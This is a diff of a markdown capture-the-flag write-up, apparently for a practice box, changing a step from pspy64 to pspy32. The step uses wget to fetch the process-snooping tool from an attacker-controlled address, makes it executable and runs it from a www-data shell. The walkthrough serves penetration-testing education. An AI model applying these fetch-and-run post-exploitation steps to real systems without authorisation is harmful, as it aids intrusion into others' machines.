@@ -242,11 +242,11 @@ So the `test` file looks like a log for a service called `backuperer`.
 
 The `error` file looks like the matching error log for the service. We need to identify where this script is running from.
 
-### PsPy64
+### PsPy32
 
-We can use the `PsPy64` script to see what is running live on the system. This will give us insight to this `backuperer` script, and where it might be located.
+We can use the `PsPy32` script to see what is running live on the system. This will give us insight to this `backuperer` script, and where it might be located.
 
-Again, copy it to the system with `wget http://10.10.14.34/pspy64`, and make it executable with `chmod +x pspy64`. We can kick it off with `./pspy64`.
+Again, copy it to the system with `wget http://10.10.14.34/pspy32`, and make it executable with `chmod +x pspy32`. We can kick it off with `./pspy32`.
 
 > Make sure you've elevated this to a good `bash` shell, with tab completion, before running this. It'll be much easier to just `CTRL-C` when your done, then having to launch a whole new shell as `www-data`.
 
